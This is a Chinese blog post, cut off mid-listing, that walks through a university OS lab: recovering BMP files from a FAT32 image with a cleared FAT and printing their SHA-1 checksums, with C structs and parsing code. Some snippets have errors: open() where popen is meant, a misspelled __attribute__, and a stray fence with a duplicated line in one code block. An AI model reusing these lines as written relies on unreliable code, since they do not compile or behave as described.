在对于<strong>FAT32</strong>文件系统有了足够的认识以后，就可以发现，数据区的<strong>clusters</strong>，在实验情况中，可以分成一下几种情况：</p><ol><li>目录文件，存储若干目录项(directory entry)，对应手册<strong>Section 6</strong>和<strong>Section 7</strong>描述的内容。注意<strong>Section 7</strong>是非常重要的，因为实验要求必须恢复出完整的文件名;</li><li><strong>BMP</strong>文件的头部，以<strong>424d(BM)</strong>开头；</li><li><strong>BMP</strong>文件的实际数据，按照<strong>3</strong>字节一组，按顺序存储了图片中的所有像素；</li><li><p>未使用的<strong>cluster</strong></p><p>在<strong>FAT</strong>表被清除后，已经无法根据<strong>FAT</strong>恢复出目录的树状结构了。因此接下来要做的是一个分类问题：需要依次扫描磁盘中的所有<strong>clusters</strong>，并将它们标记为以上4类。这里不需要使用任何机器学习的知识——可以手工硬编码一些特征，就足够完成识别了，例如目录文件里总是包含大量的<strong>BMP</strong>字符，这些是数据和<strong>bitmap</strong>文件头所没有的。不需要做得100%准确，因为实验只要求恢复相当一部分文件即可；但是要小心地编写健壮的代码，使得分类错误发生时，程序不会发生太大的问题——程序很可能在错误分类时(例如将位图数据解析成目录时)，由于非法的输入而崩溃</p></li></ol><h3 id="图片数据恢复"><a href="#图片数据恢复" class="headerlink" title="图片数据恢复"></a>图片数据恢复</h3><p>  接下来，需要的是恢复目录文件中的目录项，从而得到文件名。手册上对目录文件中的目录项给出了精确的定义。<br>  <img src="fat-directory-entry.png" alt="FAT目录项"><br>  当需要写代码解析文件时，手册就比<strong>blog posts</strong>靠谱得多了。在这里，要小心目录项可能跨过<strong>cluster</strong>的情况——当然简单起见，可以放弃这个文件的恢复，只要程序不会因此崩溃就行</p><p>  当恢复出一个目录项以后，不仅得到了正确的文件名，而且得到了一个非常有用的信息：这个文件名对应的<strong>cluster ID</strong>。可以根据这个块的编号，找到一个保证是<strong>BMP header</strong>的<strong>cluster</strong>——可以和扫描的<strong>clusters</strong>的分类结果进行匹配，如果这个<strong>cluster</strong>不是一个<strong>bitmap header</strong>，则需要放弃该文件的恢复</p><p>  接下来的工作就是恢复图片的剩余部分！最简单地，可以假设图片剩下的部分<strong>(clusters)</strong>都连续地存储在文件中。因此，只需要知道文件的大小(这个信息在目录项中也有)，就可以直接恢复出一张图片了</p><p>  当然，如果希望做得更好一些，注意到<strong>bitmap</strong>是按照行优先顺序逐个存储像素的。在默认情况下，可以直接把连续的下一个<strong>cluster</strong>纳入到恢复的图片文件中。但与此同时，也可以检查“加入”的这些像素是否符合图片在视觉意义上的合理性。例如，在现实世界中的图片大多是“连续”变化的，即绝大部分相邻的像素，像素值都不会发生剧烈的变化。这样的想法其实对应了对图像在二维空间上进行求导(<strong>gradient</strong>)，而大部分像素的导数都是很小的。<br>  <img src="figure-recovery-trick.png" alt="图像连续变化"></p><p>  如果在拼接时，检测到了异常，不妨可以去所有的<strong>cluster</strong>中寻找能够最好地<strong>拼接</strong>在当前<strong>cluster</strong>之后的数据。使用一个简单的贪心算法就可以获取很不错的数据恢复结果</p><h3 id="计算校验和"><a href="#计算校验和" class="headerlink" title="计算校验和"></a>计算校验和</h3><p>  终于，这里得到了文件名、文件的大小以及文件的所有数据——是时候将校验和进行输出了。在该实验中，需要调用外部工具<strong>sha1sum</strong>计算校验和。<strong>sha1sum</strong>的命令行工具可以从<strong>stdin</strong>(或者文件)读取数据，然后把<strong>hash digest</strong>输出到标准输出：<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;Hello, World&quot;</span> | <span class="built_in">sha1sum</span></span><br><span class="line">4ab299c8ad6ed14f31923dd94f8b5f5cb89dfb54  -</span><br></pre></td></tr></table></figure></p><p>  <strong>sha1sum</strong>是一种计算字节序列“指纹”的算法。指纹(fingerprint)也称为校验和(checksum)，它是一个单向的<strong>hash function <em>H</em></strong>，能把一个很大空间里的字符串映射到很小的空间中，并且目前而言，给定一个<strong>fingerprint</strong>后的字符串<em>t</em>，人类很难计算出一个字符串<em>x</em>，满足<script type="math/tex">H(x) = t</script>。指纹能在不传输整个文件的前提下，快速比较两个文件是否相等。除了校验文件的完整性之外，指纹还可以用来做数据的去重——例如大家在即使通信软件中传送文件时，服务器会用校验和检查是否已经存在文件的副本，如果是就可以立即结束传输(所以在上传一些别人可能已经上传过的文件时，会出现大文件“秒传”的情况)</p><p>  如果不希望在这个实验中重复<strong>pipe-fork-execve</strong>的流程，<strong>popen</strong>可以很好地解决这个问题：可以将恢复出的文件写入文件系统中的任何位置(当然是某个临时目录)，然后用<strong>popen</strong>读取<strong>sha1sum</strong>的输出到缓冲区，最后将其输出即可<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fp = open(<span class="string">&quot;sha1sum /tmp/your-tmp-filename&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">panic_on(!fp, <span class="string">&quot;popen&quot;</span>);</span><br><span class="line"><span class="built_in">fscanf</span>(fp, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">pclose(fp);</span><br></pre></td></tr></table></figure></p><h3 id="调试你的程序"><a href="#调试你的程序" class="headerlink" title="调试你的程序"></a>调试你的程序</h3><p>  本次程序稍微有些长。可能需要一些<strong>logging</strong>，才能较好地帮助完成任务。记录日志时，要小心干扰到<strong>Online Judge</strong>。注意依然只能编写一个<strong>.c</strong>文件，因此适当的使用<strong>IDE</strong>和代码折叠，可以极大地提高编码效率。</p><p>  除此之外，该实验中一个常见的问题是，很多时候并不知道程序“为什么”没有回复出正确的图片——虽然知道每一个图片的<strong>sha1sum</strong>，但是这些数值看起来像是随机的数字，只要有一个字节的差异，它们就会看起来完全不同。</p><p>  一个调试的好办法是<strong>visualization</strong>：在调试时，将恢复出的图片输出到某个目录中，然后直接“肉眼”观察恢复的结果，就可以发现有些图片得到了正确的恢复，而有些没有。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>  切换到<strong>master</strong>分支，然后从github上拉去<strong>M5</strong>实验即可<br>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add jyy https://hub.fastgit.org/NJU-ProjectN/os-workbench.git &amp;&amp; git checkout master &amp;&amp; git pull jyy M5</span><br></pre></td></tr></table></figure></p><h2 id="实验实现"><a href="#实验实现" class="headerlink" title="实验实现"></a>实验实现</h2><p>  下面是个人的思路及其实现，<a href="https://gitee.com/jiaweihawk/nju-os/tree/7b6a11bf34a02e70fb9f495d2bc417266fac4bd7/">实验实现</a></p><p>  整体实验的思路非常简单：</p><ol><li>解析FAT文件系统</li><li>遍历<strong>Root Directory Region</strong>和<strong>File &amp; Directory(Data) Region</strong>，找出目录项</li><li>解析目录项，找出<strong>BMP</strong>类型文件</li><li>计算<strong>BMP</strong>文件的<strong>sha1</strong>值，并输出即可</li></ol><h3 id="解析FAT文件系统"><a href="#解析FAT文件系统" class="headerlink" title="解析FAT文件系统"></a>解析FAT文件系统</h3><p>  首先直接将待解析的文件系统映射入内存中，方便对文件系统的各种操作</p><p>  然后，解析<strong>FAT</strong>文件系统就非常简单了——按照文档中的<strong>FAT</strong>数据结构，解析相关的字段即可</p><p>  虽然如此，这里面有两个大坑</p><ol><li><strong>FAT</strong>文件系统的数据结构<br>这里在实现<strong>FAT</strong>数据结构时，往往以结构体进行实现。在实现结构体的时候，与之前不同的是，需要以如下形式进行实现<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BPB_COMMON</span> &#123;</span></span><br><span class="line">&#125;__attrubte__((packed)) BPB;</span><br></pre></td></tr></table></figure>也就是添加<strong>packed</strong>属性，从而避免大于1字节的结构体的字段进行对齐操作，从而更改其在结构体中预设的偏移值</li><li><p>识别<strong>FAT</strong>类型<br>按照微软的手册，其通过计算<strong>CountOfClusters</strong>，既可以区分<strong>FAT12</strong>、<strong>FAT16</strong>或<strong>FAT32</strong><br>然而并非如此——通过<strong>mkfs.fat</strong>命令生成的<strong>FAT</strong>文件系统，其不符合上述的规则。<br>因此，最终通过如下规则来识别<strong>FAT</strong>类型</p><ol><li>如果<strong>BPB_FATSz16</strong>字段为0，则为<strong>FAT32</strong>类型；否则进行下面的判断</li><li>如果<strong>CountOfClusters</strong>小于4085，则为<strong>FAT12</strong>；否则进行下面的判断</li><li>为<strong>FAT16</strong></li></ol><p>最终，这部分的逻辑实现如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 即FAT的BPB(BIOS Parameter Block)</span></span><br><span class="line"><span class="comment"> * 位于Volume的第一个Sector</span></span><br><span class="line"><span class="comment"> * FAT12、FAT16和FAT32的BPB不尽相同</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 这里特别说明一下，这里需要__attribute__((packed))，否则可能结构体对齐导致异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 所有BPB共有的字段</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BPB_COMMON</span> &#123;</span></span><br><span class="line">   <span class="type">uint8_t</span> jmpBoot[<span class="number">3</span>];</span><br><span class="line">   <span class="type">char</span> OEMName[<span class="number">8</span>];</span><br><span class="line">   <span class="type">uint16_t</span> BytsPerSec;</span><br><span class="line">   <span class="type">uint8_t</span> SecPerClus;</span><br><span class="line">   <span class="type">uint16_t</span> RsvdSecCnt;</span><br><span class="line">   <span class="type">uint8_t</span> NumFATs;</span><br><span class="line">   <span class="type">uint16_t</span> RootEntCnt;</span><br><span class="line">   <span class="type">uint16_t</span> TotSec16;</span><br><span class="line">   <span class="type">uint8_t</span> Media;</span><br><span class="line">   <span class="type">uint16_t</span> FATSz16;</span><br><span class="line">   <span class="type">uint16_t</span> SecPerTrk;</span><br><span class="line">   <span class="type">uint16_t</span> NumHeads;</span><br><span class="line">   <span class="type">uint32_t</span> HiddSec;</span><br><span class="line">   <span class="type">uint32_t</span> TotSec32;</span><br><span class="line">&#125;__attribute__((packed)) BPB_COMMON;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FAT12和FAT16的拓展字段</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EXBPB_FAT12</span>&#123;</span></span><br><span class="line">   <span class="type">uint8_t</span> DrvNum;</span><br><span class="line">   <span class="type">uint8_t</span> Reserved1;</span><br><span class="line">   <span class="type">uint8_t</span> BootSig;</span><br><span class="line">   <span class="type">uint32_t</span> VoIID;</span><br><span class="line">   <span class="type">uint8_t</span> VoILab[<span class="number">11</span>];</span><br><span class="line">   <span class="type">char</span> FilSysType[<span class="number">8</span>];</span><br><span class="line">   <span class="type">uint8_t</span> padding1[<span class="number">448</span>];</span><br><span class="line">   <span class="type">uint16_t</span> Signature_word;</span><br><span class="line">   <span class="type">uint8_t</span> padding2[<span class="number">512</span>];</span><br><span class="line">&#125;__attribute__((packed)) EXBPB_FAT12;</span><br><span class="line"><span class="keyword">typedef</span> EXBPB_FAT12 EXBPB_FAT16;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FAT32拓展字段</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">EXBPB_FAT32</span> &#123;</span></span><br><span class="line">    <span class="type">uint32_t</span> FATSz32;</span><br><span class="line">    <span class="type">uint16_t</span> ExtFlags;</span><br><span class="line">    <span class="type">uint16_t</span> FSVer;</span><br><span class="line">    <span class="type">uint32_t</span> RootClus;</span><br><span class="line">    <span class="type">uint16_t</span> FSInfo;</span><br><span class="line">    <span class="type">uint16_t</span> BkBootSec;</span><br><span class="line">    <span class="type">uint8_t</span> Reserved[<span class="number">12</span>];</span><br><span class="line">    <span class="type">uint8_t</span> DrvNum;</span><br><span class="line">    <span class="type">uint8_t</span> Reserved1;</span><br><span class="line">    <span class="type">uint8_t</span> BootSig;</span><br><span class="line">    <span class="type">uint32_t</span> VoIID;</span><br><span class="line">    <span class="type">uint8_t</span> VoILab[<span class="number">11</span>];</span><br><span class="line">    <span class="type">char</span> FilSysType[<span class="number">8</span>];</span><br><span class="line">    <span class="type">uint8_t</span> padding1[<span class="number">420</span>];</span><br><span class="line">    <span class="type">uint16_t</span> Signature_word;</span><br><span class="line">    <span class="type">uint8_t</span> padding2[<span class="number">512</span>];</span><br><span class="line">&#125;__attribute__((packed)) EXBPB_FAT32;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BPB_DEF(type) \</span></span><br><span class="line"><span class="meta">    typedef struct BPB_FAT##type &#123;\</span></span><br><span class="line"><span class="meta">        BPB_COMMON combpb; \</span></span><br><span class="line"><span class="meta">        EXBPB_FAT##type exbpb; \</span></span><br><span class="line"><span class="meta">    &#125; BPB_FAT##type;</span></span><br><span class="line"></span><br><span class="line">BPB_DEF(<span class="number">12</span>);</span><br><span class="line">BPB_DEF(<span class="number">16</span>);</span><br><span class="line">BPB_DEF(<span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 参数1： const char *file_name</span></span><br><span class="line"><span class="comment"> * 返回值： void *addr</span></span><br><span class="line"><span class="comment"> *  </span></span><br><span class="line"><span class="comment"> * 即将传入的file_name，通过mmap映射入内存中</span></span><br><span class="line"><span class="comment"> * 并将映射的基址返回即可</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 如果出现任何异常，直接输出异常信息，并退出即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span>*</span><br><span class="line"><span class="title function_">file_load</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file_name)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 根据file_name</span></span><br><span class="line"><span class="comment">     * 以只读权限打开文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> fd = <span class="number">-1</span>;</span><br><span class="line">    assert((fd = open(file_name, O_RDONLY)) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 获取文件结构</span></span><br><span class="line"><span class="comment">     * 根据该文件结构，获取文件大小</span></span><br><span class="line"><span class="comment">     * 从而mmap该大小的文件即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">sb</span>;</span></span><br><span class="line">    assert(fstat(fd, &amp;sb) != <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> *res = <span class="literal">NULL</span>;</span><br><span class="line">    assert((res = mmap(<span class="literal">NULL</span>, sb.st_size, PROT_READ, MAP_SHARED, fd, <span class="number">0</span>)) != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 参数1： const BPB_COMMON *addr</span></span><br><span class="line"><span class="comment"> * 返回值: int type</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 即将传入的FAT文件系统的第一个sector进行解析，从而获取FAT类型</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 按照微软文档中所说，FAT类型仅仅和CountOfClusters相关，实际上和file命令结果不相同</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 这里采取如下算法进行判别</span></span><br><span class="line"><span class="comment"> * 1. 如果BPB_FATSz16字段为0，则直接为FAT32</span></span><br><span class="line"><span class="comment"> * 2. 根据CountOfClusters，判别是FAT12亦或是FAT16即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">get_fat_type</span><span class="params">(<span class="type">const</span> BPB_COMMON *bpb)</span></span><br><span class="line">&#123;</span><br><span class="line">    assert(bpb != <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(bpb-&gt;FATSz16 == <span class="number">0</span>) &#123; <span class="keyword">return</span> FAT_TYPE_FAT32; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint64_t</span> RootDirSectors = ((bpb-&gt;RootEntCnt * <span class="number">32</span>) + (bpb-&gt;BytsPerSec - <span class="number">1</span>)) / bpb-&gt;BytsPerSec,</span><br><span class="line">        FATSz = bpb-&gt;FATSz16,</span><br><span class="line">        TotSec = (bpb-&gt;TotSec16 != <span class="number">0</span>) ? bpb-&gt;TotSec16 : bpb-&gt;TotSec32,</span><br><span class="line">        DataSec = TotSec - (bpb-&gt;RsvdSecCnt + (bpb-&gt;NumFATs * FATSz) + RootDirSectors),</span><br><span class="line">        CountofClusters = DataSec / bpb-&gt;SecPerClus;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(CountofClusters &lt; <span class="number">4085</span>) &#123; <span class="keyword">return</span> FAT_TYPE_FAT12; &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(CountofClusters &lt; <span class="number">65525</span>) &#123; <span class="keyword">return</span> FAT_TYPE_FAT16; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">```  </span><br><span class="line">&#125;__attribute__((packed)) BPB_COMMON; </span><br></pre></td></tr></table></figure><p>添加了<strong>packed</strong>属性，这里是为了避免结构体中大于1字节的字段的对齐，从而导致一些难以解释的错误</p></li></ol><h3 id="遍历Root-Directory-Region和Data-Region"><a href="#遍历Root-Directory-Region和Data-Region" class="headerlink" title="遍历Root Directory Region和Data Region"></a>遍历Root Directory Region和Data Region</h3><p>  在上述解析完<strong>FAT</strong>格式后，即可获取<strong>Root Directory Region</strong>和<strong>Data Region</strong>在文件系统中的偏移和大小，从而进行解析</p><p>  这里主要按照簇为单位，遍历上述区域，从而找到文件系统中所有的目录簇即可</p><p>  因此该部分的核心就是判断簇为目录簇——要在确保不崩溃的情况下，尽可能准确的判断是否为目录<br>  而每个目录簇由诸多目录簇构成，具有如下特征：</p><ol><li>任何目录簇都不可能是空的——要么根目录包含一个<strong>ATTR_VOLUME_ID</strong>的普通目录项；要么包含<strong>.</strong>和<strong>..</strong>普通目录项；要么包含跨簇的剩余目录项</li><li>对于普通目录项，若其<strong>DIR_NAME</strong>字段为0，则当前目录项和该簇内后续的目录项所有字段皆为0;否则，其<strong>DIR_NTRes</strong>字段为0</li><li><p>对于长名目录项，其包含若干个连续的(逻辑连续)长名目录项和一个普通目录项，其中长名目录项们的<strong>LDIR_Type</strong>和<strong>LDIR_FstClusLO</strong>字段为0，并且<strong>LDIR_Ord</strong>字段翻序排列，第一个长名目录项的<strong>LDIR_Ord</strong>还需要添加<strong>0x40</strong>；而不同目录项并没有什么额外的特殊即可</p><p>因此，本实验判断簇为目录簇的逻辑就是验证上述的特征是否成立即可——这里需要特别小心跨簇的长名目录项，对于跨簇的后边的长名目录项来说，其无法验证相关的第一个长名目录项的<strong>LDIR_Ord</strong>的<strong>0x40</strong>特征，从而导致误将应该是目录簇的簇判别为非目录簇</p><p>该部分的实现逻辑如下所示</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//正常Directory Structure结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">SDIR</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> Name[<span class="number">11</span>];</span><br><span class="line">    <span class="type">uint8_t</span> Attr;</span><br><span class="line">    <span class="type">uint8_t</span> NTRes;</span><br><span class="line">    <span class="type">uint8_t</span> CrtTimeTenth;</span><br><span class="line">    <span class="type">uint16_t</span> CrtTime;</span><br><span class="line">    <span class="type">uint16_t</span> CrtDate;</span><br><span class="line">    <span class="type">uint16_t</span> LstAccDate;</span><br><span class="line">    <span class="type">uint16_t</span> FstClusHI;</span><br><span class="line">    <span class="type">uint16_t</span> WrtTime;</span><br><span class="line">    <span class="type">uint16_t</span> WrtDate;</span><br><span class="line">    <span class="type">uint16_t</span> FstClusLO;</span><br><span class="line">    <span class="type">uint32_t</span> FileSize;</span><br><span class="line">&#125;__attribute__((packed)) SDIR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Long File Name目录结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LDIR</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> Ord;</span><br><span class="line">    <span class="type">char</span> Name1[<span class="number">10</span>];</span><br><span class="line">    <span class="type">uint8_t</span> Attr;</span><br><span class="line">    <span class="type">uint8_t</span> Type;</span><br><span class="line">    <span class="type">uint8_t</span> Chksum;</span><br><span class="line">    <span class="type">char</span> Name2[<span class="number">12</span>];</span><br><span class="line">    <span class="type">uint16_t</span> FstClusLO;</span><br><span class="line">    <span class="type">char</span> Name3[<span class="number">4</span>];</span><br><span class="line">&#125;__attribute__((packed)) LDIR;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    SDIR sdir;</span><br><span class="line">    LDIR ldir;</span><br><span class="line">&#125; DIR;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_LONG_ENTRY         (0x40)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTR_READ_ONLY          (0x01)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTR_HIDDEN             (0x02)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTR_SYSTEM             (0x04)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTR_VOLUME_ID          (0x08)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTR_DIRECTORY          (0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTR_ARCHIVE            (0x20)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTR_LONG_NAME          (ATTR_READ_ONLY | ATTR_HIDDEN | ATTR_SYSTEM | ATTR_VOLUME_ID)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ATTR_NUL                (0x0)</span></span><br><span 